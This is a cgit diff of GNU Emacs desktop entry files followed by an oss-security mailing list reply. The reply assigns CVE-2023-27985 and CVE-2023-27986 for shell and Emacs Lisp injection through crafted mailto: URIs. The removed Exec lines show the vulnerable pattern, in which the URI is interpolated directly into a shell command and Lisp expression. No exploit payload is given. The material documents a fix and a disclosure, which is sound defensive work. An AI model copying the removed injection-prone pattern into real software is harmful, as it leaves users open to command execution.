| diff --git a/etc/emacsclient-mail.desktop b/etc/emacsclient-mail.desktopindex b575a41..91df122 100644--- a/[etc/emacsclient-mail.desktop](/cgit/emacs.git/tree/etc/emacsclient-mail.desktop?h=emacs-29&id=286c48137f69fa96b80d197da90c69a42df604a3)+++ b/[etc/emacsclient-mail.desktop](/cgit/emacs.git/tree/etc/emacsclient-mail.desktop?h=emacs-29&id=d32091199ae5de590a83f1542a01d75fba000467)@@ -1,7 +1,7 @@ [Desktop Entry] Categories=Network;Email; Comment=GNU Emacs is an extensible, customizable text editor - and more-Exec=sh -c "exec emacsclient --alternate-editor= --display=\\"\\$DISPLAY\\" --eval \\\\(message-mailto\\\\ \\\\\\"%u\\\\\\"\\\\)"+Exec=sh -c "exec emacsclient --alternate-editor= --display=\\"\\$DISPLAY\\" --eval \\"(message-mailto \\\\\\"\\$1\\\\\\")\\"" sh %u Icon=emacs Name=Emacs (Mail, Client) MimeType=x-scheme-handler/mailto;@@ -13,7 +13,7 @@ Actions=new-window;new-instance;  [Desktop Action new-window] Name=New Window-Exec=emacsclient --alternate-editor= --create-frame --eval "(message-mailto \\"%u\\")"+Exec=sh -c "exec emacsclient --alternate-editor= --create-frame --eval \\"(message-mailto \\\\\\"\\$1\\\\\\")\\"" sh %u  [Desktop Action new-instance] Name=New Instancediff --git a/etc/emacsclient.desktop b/etc/emacsclient.desktopindex 1ecdecf..a9f840c7 100644--- a/[etc/emacsclient.desktop](/cgit/emacs.git/tree/etc/emacsclient.desktop?h=emacs-29&id=286c48137f69fa96b80d197da90c69a42df604a3)+++ b/[etc/emacsclient.desktop](/cgit/emacs.git/tree/etc/emacsclient.desktop?h=emacs-29&id=d32091199ae5de590a83f1542a01d75fba000467)@@ -3,7 +3,7 @@ Name=Emacs (Client) GenericName=Text Editor Comment=Edit text MimeType=text/english;text/plain;text/x-makefile;text/x-c++hdr;text/x-c++src;text/x-chdr;text/x-csrc;text/x-java;text/x-moc;text/x-pascal;text/x-tcl;text/x-tex;application/x-shellscript;text/x-c;text/x-c++;-Exec=sh -c "if [ -n \\"\\$\*\\" ]; then exec emacsclient --alternate-editor= --display=\\"\\$DISPLAY\\" \\"\\$@\\"; else exec emacsclient --alternate-editor= --create-frame; fi" placeholder %F+Exec=sh -c "if [ -n \\"\\$\*\\" ]; then exec emacsclient --alternate-editor= --display=\\"\\$DISPLAY\\" \\"\\$@\\"; else exec emacsclient --alternate-editor= --create-frame; fi" sh %F Icon=emacs Type=Application Terminal=false |
| --- |

generated by [cgit v1.1](https://git.zx2c4.com/cgit/about/) at 2025-01-15 08:45:40 +0000



=== Content from www.openwall.com_0c1e0f3a_20250115_084541.html ===


| [Openwall](/) * [Products](/)   + [Openwall GNU/\*/Linux   *server OS*](/Owl/)+ [Linux Kernel Runtime Guard](/lkrg/)+ [John the Ripper   *password cracker*](/john/)         - [Free & Open Source for any platform](/john/)- [in the cloud](/john/cloud/)- [Pro for Linux](/john/pro/linux/)- [Pro for macOS](/john/pro/macosx/)+ [Wordlists   *for password cracking*](/wordlists/)+ [passwdqc   *policy enforcement*](/passwdqc/)             - [Free & Open Source for Unix](/passwdqc/)- [Pro for Windows (Active Directory)](/passwdqc/windows/)+ [yescrypt   *KDF & password hashing*](/yescrypt/)+ [yespower   *Proof-of-Work (PoW)*](/yespower/)+ [crypt\_blowfish   *password hashing*](/crypt/)+ [phpass   *ditto in PHP*](/phpass/)+ [tcb   *better password shadowing*](/tcb/)+ [Pluggable Authentication Modules](/pam/)+ [scanlogd   *port scan detector*](/scanlogd/)+ [popa3d   *tiny POP3 daemon*](/popa3d/)+ [blists   *web interface to mailing lists*](/blists/)+ [msulogin   *single user mode login*](/msulogin/)+ [php\_mt\_seed   *mt\_rand() cracker*](/php_mt_seed/)* [Services](/services/)* Publications       + [Articles](/articles/)+ [Presentations](/presentations/)* Resources         + [Mailing lists](/lists/)+ [Community wiki](https://openwall.info/wiki/)+ [Source code repositories (GitHub)](https://github.com/openwall)+ [Source code repositories (CVSweb)](https://cvsweb.openwall.com)+ [File archive & mirrors](/mirrors/)+ [How to verify digital signatures](/signatures/)+ [OVE IDs](/ove/)* [What's new](/news) | |
| --- | --- |

| | [Follow @Openwall on Twitter for new release announcements and other news](https://twitter.com/openwall) | | --- | |
| --- | --- |

[[<prev]](../../../2023/03/08/3) [[next>]](2) [[<thread-prev]](../../../2023/03/08/2) [[day]](.) [[month]](..) [[year]](../..) [[list]](../../..)
```

Message-ID: <ZAmHgoA8GvuVpS2V@eldamar.lan>
Date: Thu, 9 Mar 2023 08:15:14 +0100
From: Salvatore Bonaccorso <carnil@...ian.org>
To: oss-security@...ts.openwall.com
Subject: Re: Shell command and Emacs Lisp code injection in
 emacsclient-mail.desktop

Hi,

On Wed, Mar 08, 2023 at 12:37:29PM +0100, Gabriel Corona wrote:
> emacsclient-mail.desktop is vulnerable to shell command
> injections and Emacs Lisp injections through a crafted
> mailto: URI.

Two CVEs are assigned by MITRE:

>
> This has been introduced in Emacs 28.1:
>
> <http://git.savannah.gnu.org/cgit/emacs.git/commit/?h=emacs-29&id=b1b05c828d67930bb3b897fe98e1992db42cf23c>
>
> A fix for shell command injection is currently included
> in the upcoming 28.3 branch:
>
> <http://git.savannah.gnu.org/cgit/emacs.git/commit/?h=emacs-29&id=d32091199ae5de590a83f1542a01d75fba000467>

CVE-2023-27985

>
> A fix for both is currently included in the upcoming 29.1 branch:
>
> <http://git.savannah.gnu.org/cgit/emacs.git/commit/?h=emacs-29&id=3c1693d08b0a71d40a77e7b40c0ebc42dca2d2cc>

CVE-2023-27986

Regards,
Salvatore

```

[Powered by blists](https://www.openwall.com/blists/) - [more mailing lists](https://lists.openwall.net)

Please check out the
[Open Source Software Security Wiki](https://oss-security.openwall.org/wiki/), which is counterpart to this
[mailing list](https://oss-security.openwall.org/wiki/mailing-lists/oss-security).

Confused about [mailing lists](/lists/) and their use?
[Read about mailing lists on Wikipedia](https://en.wikipedia.org/wiki/Electronic_mailing_list)
and check out these
[guidelines on proper formatting of your messages](https://www.complang.tuwien.ac.at/anton/mail-news-errors.html).


